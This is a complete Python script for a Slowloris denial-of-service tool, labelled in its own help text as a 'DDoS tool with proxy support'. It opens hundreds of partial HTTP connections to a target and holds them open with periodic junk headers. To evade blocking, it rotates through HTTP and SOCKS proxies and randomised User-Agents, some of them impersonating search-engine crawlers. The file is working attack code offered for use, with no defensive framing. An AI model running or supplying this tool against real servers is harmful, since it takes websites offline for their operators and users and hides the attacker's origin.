import os
import sys
import socket
import ssl
import time
import random
import threading
import logging
import argparse

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class _Dummy:
        def __getattr__(self, _):
            return ""
    Fore = Style = _Dummy()

class ColorFormatter(logging.Formatter):
    COLORS = {
        logging.DEBUG: Fore.CYAN,
        logging.INFO: Fore.GREEN,
        logging.WARNING: Fore.YELLOW,
        logging.ERROR: Fore.RED,
        logging.CRITICAL: Fore.MAGENTA,
    }
    def format(self, record):
        color = self.COLORS.get(record.levelno, "") if COLORAMA_AVAILABLE else ""
        record.levelname = f"{color}{record.levelname}{Style.RESET_ALL if COLORAMA_AVAILABLE else ''}"
        record.msg = f"{color}{record.getMessage()}{Style.RESET_ALL if COLORAMA_AVAILABLE else ''}"
        return super().format(record)

logger = logging.getLogger("slowloris")
handler = logging.StreamHandler()
handler.setFormatter(ColorFormatter('%(asctime)s | %(levelname)-8s | %(message)s'))
logger.addHandler(handler)
logger.setLevel(logging.INFO)


from itertools import cycle
from urllib.parse import urlparse

try:
    import socks  # PySocks
except ImportError:
    print("PySocks library is required. Install it via: pip install pysocks")
    sys.exit(1)


BANNER = f"""
{Fore.GREEN if COLORAMA_AVAILABLE else ''}   _____ _               _                _     
  / ____| |             | |              (_)    
 | (___ | | _____      _| |     ___  _ __ _ ___ 
  \\___ \\| |/ _ \\ \\ /\\ / / |    / _ \\| '__| / __|
  ____) | | (_) \\ V  V /| |___| (_) | |  | \\__ \\
 |_____/|_|\\___/ \\_/\\_/ |______\\___/|_|  |_|___/
{Style.RESET_ALL if COLORAMA_AVAILABLE else ''}"""


class Slowloris:
    def __init__(self, target, port=80, sockets=500, proxies=None,
                 verbose=False, rand_ua=False, use_https=False, sleep_time=15, duration=60):
        self.target_host, self.target_port = self.parse_target(target, port, use_https)
        self.sockets_count = sockets
        self.proxies = proxies or []
        self.verbose = verbose
        self.rand_ua = rand_ua
        self.use_https = use_https
        self.sleep_time = sleep_time
        self.duration = duration

        self.is_running = False
        self.sockets = []
        self.lock = threading.Lock()

        self.stats = {
            'sockets_created': 0,
            'sockets_failed': 0,
            'socks4_proxies': 0,
            'socks5_proxies': 0,
            'http_proxies': 0,
            'https_proxies': 0,
            'sockets_active': 0,
            'keepalives_sent': 0,
            'errors': 0
        }

        self.user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Linux; Android 14; SM-X710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
]

    @staticmethod
    def parse_target(target, port, use_https):
        if target.startswith(("http://", "https://")):
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            return host, port
        return target, port if port else (443 if use_https else 80)

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def parse_proxy(self, proxy_line):
        proxy_type = 'http'
        if '://' in proxy_line:
            proxy_type, proxy_line = proxy_line.split('://', 1)

        username = password = None
        if '@' in proxy_line:
            auth, host_port = proxy_line.rsplit('@', 1)
            if ':' in auth:
                username, password = auth.split(':', 1)
            else:
                username = auth
        else:
            host_port = proxy_line

        if ':' in host_port:
            host, port_str = host_port.split(':', 1)
            port = int(port_str)
        else:
            host = host_port
            port = 1080

        proxy_type = proxy_type.lower()
        if proxy_type not in ['http', 'https', 'socks4', 'socks5']:
            raise ValueError(f"Unsupported proxy type: {proxy_type}")

        return {
            'type': proxy_type,
            'host': host,
            'port': port,
            'username': username,
            'password': password
        }

    def load_proxies(self, filepath):
        proxies = []
        if not os.path.isfile(filepath):
            logger.error(f"Proxy file not found: {filepath}")
            return proxies

        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                try:
                    proxies.append(self.parse_proxy(line))
                except Exception as e:
                    logger.warning(f"Invalid proxy '{line}': {e}")
        logger.info(f"Loaded {len(proxies)} proxies")
        return proxies

    def create_socket(self, proxy=None):
        try:
            if proxy:
                proxy_type = proxy['type']
                if proxy_type == 'http':
                    self.stats['http_proxies'] += 1
                elif proxy_type == 'https':
                    self.stats['https_proxies'] += 1
                elif proxy_type == 'socks4':
                    self.stats['socks4_proxies'] += 1
                elif proxy_type == 'socks5':
                    self.stats['socks5_proxies'] += 1

                s = socks.socksocket()
                proxy_map = {
                    'http': socks.HTTP,
                    'https': socks.HTTP,
                    'socks4': socks.SOCKS4,
                    'socks5': socks.SOCKS5
                }
                s.set_proxy(proxy_map[proxy_type], proxy['host'], proxy['port'],
                            username=proxy['username'], password=proxy['password'])
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(10)
            s.connect((self.target_host, self.target_port))

            if self.use_https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=self.target_host)

            ua = self.get_random_user_agent() if self.rand_ua else self.user_agents[0]
            req = (f"GET /?{random.randint(0,10000)} HTTP/1.1\r\n"
                   f"Host: {self.target_host}\r\n"
                   f"User-Agent: {ua}\r\n"
                   "Connection: keep-alive\r\n")
            s.send(req.encode('utf-8'))

            with self.lock:
                self.stats['sockets_created'] += 1
                self.stats['sockets_active'] += 1

            return s
        except Exception as e:
            with self.lock:
                self.stats['sockets_failed'] += 1
            if self.verbose:
                logger.debug(f"Socket creation failed: {e}")
            return None

    def send_keepalive(self, s):
        try:
            header = f"X-a:{random.randint(1, 5000)}\r\n"
            s.send(header.encode('utf-8'))
            with self.lock:
                self.stats['keepalives_sent'] += 1
            return True
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
                self.stats['sockets_active'] -= 1
            if self.verbose:
                logger.debug(f"Keepalive failed: {e}")
            return False

    def start_attack(self):
        self.is_running = True
        proxy_cycle = cycle(self.proxies) if self.proxies else None

        logger.info(f"Starting attack on {self.target_host}:{self.target_port}")
        logger.info("Attack started")
        logger.info(f"Duration: {self.duration} seconds")
        logger.info(f"Initializing {self.sockets_count} sockets...")

        start_time = time.time()
        sockets_created = 0

        while self.is_running and sockets_created < self.sockets_count:
            if time.time() - start_time > self.duration:
                logger.info("Attack duration reached during initialization")
                self.is_running = False
                break

            proxy = next(proxy_cycle) if proxy_cycle else None
            sock = self.create_socket(proxy)
            if sock:
                self.sockets.append(sock)
                sockets_created += 1

            time.sleep(0.01)

        while self.is_running:
            if time.time() - start_time > self.duration:
                logger.info("Attack duration reached. Stopping attack.")
                self.is_running = False
                break

            with self.lock:
                active = self.stats['sockets_active']

            if active < self.sockets_count:
                needed = self.sockets_count - active
                for _ in range(needed):
                    proxy = next(proxy_cycle) if proxy_cycle else None
                    sock = self.create_socket(proxy)
                    if sock:
                        self.sockets.append(sock)

            # Send keepalive headers
            for sock in list(self.sockets):
                if not self.send_keepalive(sock):
                    try:
                        sock.close()
                    except:
                        pass
                    with self.lock:
                        if sock in self.sockets:
                            self.sockets.remove(sock)

            with self.lock:
                logger.info(f"Attack running with {self.stats['sockets_active']} active connections")

            time.sleep(self.sleep_time)

    def stop(self):
        if not self.is_running:
            logger.info("Attack is not running")
            return

        logger.info("Stopping attack...")
        self.is_running = False

        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()

        logger.info("Attack stopped")
        logger.info("Final statistics:")
        for key in ['sockets_created', 'sockets_failed', 'socks4_proxies', 'socks5_proxies',
                    'http_proxies', 'https_proxies', 'sockets_active', 'keepalives_sent', 'errors']:
            logger.info(f"{key.replace('_', ' ').title()}: {self.stats[key]}")


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="Slowloris DDoS tool with proxy support")
    parser.add_argument("target", help="Target URL or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port, default 80")
    parser.add_argument("-s", "--sockets", type=int, default=500, help="Number of sockets")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-ua", "--randuseragents", action="store_true", help="Randomize User-Agent")
    parser.add_argument("-x", "--useproxy", help="Proxy file path (supports HTTP, HTTPS, SOCKS4, SOCKS5 proxies)")
    parser.add_argument("--https", action="store_true", help="Use HTTPS")
    parser.add_argument("--sleeptime", type=int, default=15, help="Sleep time between headers in seconds")
    parser.add_argument("--duration", type=int, default=60, help="Duration of attack in seconds")

    args = parser.parse_args()

    logger.setLevel(logging.DEBUG if args.verbose else logging.INFO)

    sl = Slowloris(
        target=args.target,
        port=args.port,
        sockets=args.sockets,
        verbose=args.verbose,
        rand_ua=args.randuseragents,
        use_https=args.https,
        sleep_time=args.sleeptime,
        duration=args.duration
    )

    if args.useproxy:
        proxies = sl.load_proxies(args.useproxy)
        sl.proxies = proxies

    try:
        sl.start_attack()
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received. Stopping attack...")
        sl.stop()
    except Exception as e:
        logger.error(f"Critical error: {e}")
        sl.stop()
        sys.exit(1)


if __name__ == "__main__":
    main()
